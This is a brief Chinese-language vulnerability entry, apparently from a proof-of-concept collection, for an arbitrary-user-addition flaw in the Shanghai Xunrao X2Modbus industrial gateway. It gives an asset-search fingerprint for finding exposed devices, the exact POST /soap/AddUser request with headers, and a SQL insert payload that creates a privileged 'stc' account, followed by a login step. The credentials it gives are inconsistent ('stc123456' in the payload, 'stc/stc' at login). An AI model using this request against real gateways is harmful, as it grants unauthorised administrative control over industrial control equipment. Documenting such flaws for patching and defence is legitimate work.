# 上海迅饶自动化科技有限公司X2Modbus网关任意用户添加漏洞

- **系统**：上海迅饶自动化科技有限公司X2Modbus网关任意用户添加　|　**类型**：其他　|　**CVE**：—
- **指纹**：`server="SunFull-Webs"`
- **请求**：`POST /soap/AddUser HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 111`　`Cookie: language=zh-cn; language=zh-cn`

**请求体 / payload**
```
insert into userid (USERNAME,PASSWORD,PURVIEW,LOGINDATE,LOGINTIME) values('stc','stc123456','1','2024-4-8','0:31:43')

使用添加的账户`stc/stc`登录系统\
```

**其他**
- 上海迅饶自动化科技有限公司X2Modbus网关任意用户添加漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * X2Modbus